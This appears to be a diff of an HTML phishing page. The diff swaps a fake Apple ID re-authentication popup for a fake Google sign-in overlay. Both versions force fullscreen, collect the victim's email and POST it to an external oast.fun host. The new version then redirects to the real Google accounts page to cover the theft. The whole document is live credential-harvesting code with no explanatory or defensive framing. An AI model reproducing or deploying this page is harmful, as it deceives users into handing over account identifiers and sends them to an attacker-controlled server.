@@ -1,73 +1,103 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Secure Check</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Third-party Login</title>
   <style>
-    html, body {
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
       margin: 0;
-      padding: 0;
-      background: black;
-      height: 100%;
-      overflow: hidden;
     }
-    .fake-popup {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #fff;
-      border-radius: 15px;
-      width: 300px;
-      padding: 20px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.4);
+    .box {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
       text-align: center;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
     }
-    .fake-popup h2 {
+    .login-btn {
+      background: #4285F4;
+      color: white;
+      border: none;
+      padding: 12px 24px;
       font-size: 16px;
-      margin-bottom: 10px;
+      cursor: pointer;
+      border-radius: 4px;
     }
-    .fake-popup input {
+    .fake-google-login {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: white;
+    }
+    .google-box {
+      border: 1px solid #ddd;
+      padding: 40px;
+      border-radius: 8px;
+      width: 360px;
+    }
+    input[type=email] {
       width: 100%;
       padding: 10px;
-      margin-bottom: 10px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
+      margin: 20px 0;
+      font-size: 16px;
     }
-    .fake-popup button {
-      padding: 10px 20px;
-      border: none;
-      background: #007aff;
+    .next-btn {
+      background: #1a73e8;
       color: white;
-      font-weight: bold;
-      border-radius: 6px;
+      border: none;
+      padding: 10px 20px;
+      font-size: 14px;
+      cursor: pointer;
+      border-radius: 4px;
     }
   </style>
 </head>
 <body>
+  <div class="box">
+    <h2>To continue, please log in with Google</h2>
+    <button class="login-btn" onclick="triggerLogin()">🔒 Login with Google</button>
+  </div>
 
-<div class="fake-popup">
-  <h2>Re-authenticate to Continue</h2>
-  <input id="email" placeholder="Enter your Apple ID" />
-  <button onclick="exfil()">Continue</button>
-</div>
+  <div class="fake-google-login" id="loginOverlay">
+    <div class="google-box">
+      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" width="75" />
+      <h3>Sign in</h3>
+      <input id="emailField" type="email" placeholder="Email or phone" />
+      <button class="next-btn" onclick="sendData()">Next</button>
+    </div>
+  </div>
 
-<script>
-  document.addEventListener('click', () => {
-    document.documentElement.requestFullscreen().catch(()=>{});
-  });
+  <script>
+    function triggerLogin() {
+      document.documentElement.requestFullscreen().then(() => {
+        setTimeout(() => {
+          document.querySelector('.box').style.display = 'none';
+          document.getElementById('loginOverlay').style.display = 'flex';
+        }, 400);
+      });
+    }
 
-  function exfil() {
-    const data = document.getElementById('email').value;
-    fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email: data })
-    });
-    alert("Re-authentication failed. Please try again.");
-  }
-</script>
-
+    function sendData() {
+      const email = document.getElementById('emailField').value;
+      if (email.trim()) {
+        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email })
+        }).then(() => {
+          window.location.href = 'https://accounts.google.com';
+        });
+      }
+    }
+  </script>
 </body>
 </html>
